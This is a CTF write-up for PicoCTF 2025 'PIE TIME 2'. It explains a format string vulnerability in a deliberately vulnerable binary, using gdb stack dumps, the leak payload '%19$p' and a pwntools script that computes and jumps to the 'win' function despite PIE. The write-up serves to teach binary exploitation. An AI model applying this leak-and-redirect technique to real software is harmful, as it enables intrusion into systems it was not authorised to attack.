---
title: PicoCTF 2025 PIE TIME 2
time: 2025-03-29 19:00:49
categories: [CTF, PicoCTF]
tags: [binaryexploitation, reverseengineering]
---

## Description

Description given on the challenge:

> Can you try to get the flag? I'm not revealing anything anymore!!
> Additional details will be available after launching your challenge instance.

When the instance is launched, the challenge provides one binayr file and one `C` source code file.

The challenge and resources can be found on PicoCTF website: [PIE TIME 2](https://play.picoctf.org/practice/challenge/491?page=1&search=pie%202)

Note: I won't explain how different exploitations work, but I will share references that explains them.

---

## Analysis

### Code Analysis

There are three useful functions:

1. `main`: calls `call_functions`
1. `call_functions`: reads name and prints it and then reads an address and jumps to that address
1. `win`: Convenient standalone function to be used in the exploit. It simply reads the flag from file and prints it.

Definition of `call_functions` is:

```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

### Checking compile options:

```sh
# 'vuln` is the filename of the binary file

file vuln
# vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked,
# interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=89c0ed5ed3766d1b85809c2bef48b6f5f0ef9364,
# for GNU/Linux 3.2.0, not stripped


checksec --file=vuln
# Output:
# [*] '~/ctf/pico25/vuln'
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
```

Conclusion

1. 64bits address space
1. Architecture: amd64 (x86-64)
1. Position independent execution (PIE) enabled: can't figure out addresses during runtime (ofcourse without vulnerability)
1. Stack code is not executable: Can't store shellcode on stack and execute it
1. Canary is enabled: Prevents RBP override
1. Stripped: Not stripped, so it is easier to analyse in debugger
1. RELRO: Relocation Read-Only, prevent GOT overwrite

### Check Assembly code

Based on the code analysis, we figured that we will need some address, most likely address of `win` function.
Dumping the assembly code:

```sh
objdump -M intel -D -j .text ./vuln | tee pie2.text | grep 'win>'
# 000000000000136a <win>:


```

From the extracted assembly code, address of `win` function: `000000000000136a`

Note: these are offsets of instructions in the binary. Actual address will differ during runtime.

---

## Exploit

### Approach

1. First input for name is used as the first parameter to print function. This means we can use format string vulnerability to leak memory addresses.
2. Knowing that we can leak any memory on the stack, now to know exactly which memory location to leak,
   we know that when a function is called its return address is stored on the stack. So, leaking the return address
   can help us in calculating the address of other functions.
3. Once we know the return address, we can use this return address and the offset for `win` function to generate the actual
   address of the win function. We can do this, because last 3 bytes is the offset of instructions that stays the same in static code and dynamic code.
4. Above address to `win` function can now be sent as input to the next prompt where the challenge asks for an address
5. Win the challenge

### Debugging

To generate the format string payload, we should know the index of memory location to reveal.

Side note: When I say `index` they are the index of the word on the stack that we want to leak.
Eg. `printf("1st index: %X, 2nd index: %X\n", &addr1, &addr2)`,
in this statement, `addr1` can be located at index 0 or in `rdi` or other register, based on the architecture.
If it seems confusing, check out the references for related videos.

To know the index of return address (to leak its value), let's debug the binary:

- We will add the breakpoint in `call_functions` after it has finished the function prolog.
  This is because we are waiting for the `rbp`, and `rsp` values to be set for current function.
- Once the `rsp` value is updated, we can print the values `rsp` and see at which offset, our return address is located.

- Run - `gdb vuln`
- Below code block shows the interaction inside gdb
- I will skip the analysis of the binary and directly add gdb commands that will show the results in least amount of time.

```sh
# 1. print call_functions addresses
gdb) disassemble call_functions
Dump of assembler code for function call_functions:
   0x00000000000012c7 <+0>:     endbr64
   0x00000000000012cb <+4>:     push   rbp
   0x00000000000012cc <+5>:     mov    rbp,rsp
   0x00000000000012cf <+8>:     sub    rsp,0x60
   0x00000000000012d3 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000012dc <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000012e0 <+25>:    xor    eax,eax
   0x00000000000012e2 <+27>:    lea    rdi,[rip+0xd45]        # 0x202e
   0x00000000000012e9 <+34>:    mov    eax,0x0
   0x00000000000012ee <+39>:    call   0x1140 <printf@plt>
   0x00000000000012f3 <+44>:    mov    rdx,QWORD PTR [rip+0x2d26]        # 0x4020 <stdin@@GLIBC_2.2.5>
   ...
   ...
   ...


# This breakpoint can be anything after "sub    rsp,0x60"
(gdb) br *call_functions+39
Breakpoint 1 at 0x12ee

# Run the binary
(gdb) r
Starting program: /home/ainz/ctf/pico25/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00005555555552ee in call_functions ()

# Print 30 words in hex starting at "rsp"
(gdb) x/30gx $rsp
0x7fffffffe160: 0x00007fffffffe180      0x00007ffff7c92415
0x7fffffffe170: 0x0000000000000000      0x00007ffff7e045c0
0x7fffffffe180: 0x00007fffffffe1c0      0x00007ffff7c8867f
0x7fffffffe190: 0x0000000000001000      0x00007fffffffe2f8
0x7fffffffe1a0: 0x0000000000000001      0x0000000000000000
0x7fffffffe1b0: 0x0000000000000000      0x24f2921239118400
0x7fffffffe1c0: 0x00007fffffffe1d0      0x0000555555555441
0x7fffffffe1d0: 0x00007fffffffe270      0x00007ffff7c2a1ca
0x7fffffffe1e0: 0x00007fffffffe220      0x00007fffffffe2f8
0x7fffffffe1f0: 0x0000000155554040      0x0000555555555400
0x7fffffffe200: 0x00007fffffffe2f8      0x756929ca94cf3b77
0x7fffffffe210: 0x0000000000000001      0x0000000000000000
0x7fffffffe220: 0x0000000000000000      0x00007ffff7ffd000
0x7fffffffe230: 0x756929ca93ef3b77      0x756939b0132d3b77
0x7fffffffe240: 0x00007fff00000000      0x0000000000000000
```

- One way to identify which address is return address is by finding values that seems big enough to be
  an address and still smaller that other addresses.
- To clarify, all of these are addresses on stack: `0x00007fffffffe180`, `0x00007fffffffe1c0`, and other values starting with `0x00007fffffff`
- All of these are addresses in the code section: `0x0000555555555441`, `0x0000555555555400`
- This is canary: `0x24f2921239118400`
- I will pick `0x0000555555555441` as a value to leak. Reason being, this is a return address in `main` function and I can verify it be checking the disassembly code of the main function.
- In the below assembly, we can see that at `143c` there is a call to `call_functions` function and when it is called `1441` will be set as return address. and last 3 digits will
  always match with the actual return address.
- Hence, we can confirm that `0x0000555555555441` ends with `441` which gives us confidence that it is a return address.

```
0000000000001400 <main>:
    1400:       f3 0f 1e fa             endbr64
    1404:       55                      push   rbp
    1405:       48 89 e5                mov    rbp,rsp
    ...
    ...
    ...
    1432:       e8 49 fd ff ff          call   1180 <setvbuf@plt>
    1437:       b8 00 00 00 00          mov    eax,0x0
    143c:       e8 86 fe ff ff          call   12c7 <call_functions>
    1441:       b8 00 00 00 00          mov    eax,0x0
    1446:       5d                      pop    rbp
    1447:       c3                      ret
    1448:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
    144f:       00
```

- Now, to identify the index, try to find a value `idx` such that `x/gx $rsp +  (8 * idx)` prints the expected value. Check out the linked format string video in the end to know why.
- For our scenario, `idx` is `13`. This is index from `rsp`, but for printf, this index depends on calling convention.
- For amd64, calling convention is that, first 6 parameters are stored in registers and rest of the params are stored on stack.
- So, the actual index for the return address is `13 + 6 = 19`

### Payload

1. Our first payload will be `%19$p` (19 is the index for return address) in response to `Enter your name:`. It will print the return address
1. Replace the last 3 characters in the address with `36a` because address offset for `win` function is `000000000000136a`
1. Send the new address as a response to `enter the address to jump to, ex => 0x12345`
1. Capture the flag

### Python script to do the same

```python
from pwn import *

binary = './vuln'
elf = ELF(binary)

context.binary = binary

p = process(binary)

prompt = p.readuntil(b'name:')
print(prompt.decode())
payload = b'%19$p'
print("Payload:",payload)
p.sendline(payload)

addr_str = p.readline().decode().strip()
addr = list(addr_str)
# print("response addr:",addr, addr_str)

win_offset = hex(elf.symbols['win'])

for i in range(-3, 0):
    addr[i] = win_offset[i]

prompt = p.readuntil(b'0x12345: ')
print(prompt.decode())
payload = ''.join(addr).encode()
print("Payload:",payload)
p.sendline(payload)

remaining_text = p.recv()
print(remaining_text.decode())

```

## References:

1. [Format String exploits - pwn.college](https://www.youtube.com/playlist?list=PL-ymxv0nOtqrXNPl1I6qnRZpC35KC_Bxc)
1. [X86 Calling Conventions](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions)
1. [GDB Refresher - pwn.college](https://youtu.be/r185fCzdw8Y?si=SMW4iZTEfKOAHQ7x)
